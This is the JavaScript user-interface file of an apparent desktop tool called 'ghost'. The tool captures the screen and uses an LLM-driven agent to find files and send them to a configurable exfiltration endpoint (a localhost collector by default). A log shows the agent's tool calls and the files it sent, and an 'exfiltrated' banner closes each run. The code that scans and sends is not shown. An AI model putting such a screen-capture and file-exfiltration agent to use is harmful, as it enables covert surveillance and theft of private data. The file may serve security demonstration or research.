const $ = (id) => document.getElementById(id);
let config;
let capturing = true;
let running = false;

function fmtTime(iso) {
  const d = iso ? new Date(iso) : new Date();
  return d.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" });
}

function line(kind, text, extra) {
  const el = document.createElement("div");
  el.className = `line ${kind}`;
  el.textContent = text;
  if (extra) {
    const pre = document.createElement("pre");
    pre.textContent = extra;
    el.appendChild(pre);
  }
  $("log").appendChild(el);
  $("log").scrollTop = $("log").scrollHeight;
  return el;
}

function setRunning(on) {
  running = on;
  $("startBtn").hidden = on;
  $("stopBtn").hidden = !on;
  $("startBtn").disabled = on;
}

function bump(id, value) {
  $(id).textContent = String(Number($(id).textContent) + value);
}

function handle(event) {
  switch (event.type) {
    case "thought":
      line("thought", event.text);
      break;
    case "tool":
      line("tool", `${event.name}(${JSON.stringify(event.args)})`);
      break;
    case "found":
      bump("cFound", event.files.length);
      line("file", `found ${event.files.length} candidate file(s)`);
      break;
    case "file":
      line("file", `${event.file} · ${event.bytes}b${event.truncated ? " (truncated)" : ""}`, event.preview);
      break;
    case "sent":
      bump("cSent", 1);
      line("sent", `→ ${event.file}  [${event.status}]`);
      break;
    case "error":
      line("error", event.text);
      break;
    case "done":
      setRunning(false);
      $("banner").hidden = false;
      $("bannerTitle").textContent = "exfiltrated";
      $("bannerBody").textContent = event.summary;
      line("sent", event.summary);
      break;
    default:
      break;
  }
}

async function boot() {
  const info = await window.ghost.init();
  config = info.config;
  $("hostLabel").textContent = `${info.host} · ${info.home}`;
  $("every").textContent = String(Math.round(config.intervalMs / 1000));

  $("exfilUrl").value = config.exfilUrl;
  $("mode").value = config.mode;
  $("model").value = config.model;
  $("baseUrl").value = config.baseUrl;
  $("apiKey").value = config.apiKey;
  $("scanRoot").value = config.scanRoot;
  $("maxFiles").value = config.maxFiles;

  if (info.screenAccess === "granted") {
    $("screenState").textContent = "screen access granted";
  } else {
    $("screenState").textContent = `screen permission: ${info.screenAccess}`;
    $("screenState").classList.add("warn");
    $("empty").hidden = false;
  }

  window.ghost.onShot(({ dataUrl, at }) => {
    $("shot").src = dataUrl;
    $("shot").style.opacity = "1";
    $("empty").hidden = true;
    $("clock").textContent = fmtTime(at);
  });
  window.ghost.onEvent(handle);

  await window.ghost.toggleCapture(true);
  setCapturing(true);
}

function setCapturing(on) {
  capturing = on;
  $("live").classList.toggle("off", !on);
  $("live").textContent = on ? "live" : "paused";
  $("captureBtn").textContent = on ? "pause capture" : "resume capture";
}

$("grantBtn").addEventListener("click", async () => {
  await window.ghost.requestPermission();
  line("thought", "opened Privacy settings, watching for access…");
  const poll = setInterval(async () => {
    const info = await window.ghost.init();
    if (info.screenAccess === "granted") {
      clearInterval(poll);
      $("screenState").textContent = "screen access granted";
      $("screenState").classList.remove("warn");
      $("empty").hidden = true;
      line("thought", "screen access granted. if the preview stays black, restart the app.");
    }
  }, 1500);
});

$("captureBtn").addEventListener("click", async () => {
  setCapturing(!capturing);
  await window.ghost.toggleCapture(capturing);
});

$("settingsBtn").addEventListener("click", () => $("settings").showModal());

$("saveBtn").addEventListener("click", async () => {
  config = await window.ghost.saveConfig({
    exfilUrl: $("exfilUrl").value.trim(),
    mode: $("mode").value,
    model: $("model").value.trim(),
    baseUrl: $("baseUrl").value.trim(),
    apiKey: $("apiKey").value,
    scanRoot: $("scanRoot").value.trim(),
    maxFiles: Number($("maxFiles").value) || 6,
  });
  $("settings").close();
  line("thought", "settings saved.");
});

$("resetBtn").addEventListener("click", () => {
  $("exfilUrl").value = "http://127.0.0.1:8787/collect";
  $("mode").value = "scripted";
  $("maxFiles").value = "6";
  $("model").value = "gpt-4o-mini";
  $("baseUrl").value = "https://api.openai.com/v1";
});

$("startBtn").addEventListener("click", async () => {
  if (!config.exfilUrl) {
    $("settings").showModal();
    return;
  }
  $("log").innerHTML = "";
  $("banner").hidden = true;
  $("cFound").textContent = "0";
  $("cSent").textContent = "0";
  setRunning(true);
  line("thought", `mode: ${config.mode} · endpoint: ${config.exfilUrl}`);
  await window.ghost.start();
});

$("stopBtn").addEventListener("click", async () => {
  await window.ghost.stop();
  setRunning(false);
  line("error", "stopped by user.");
});

boot();
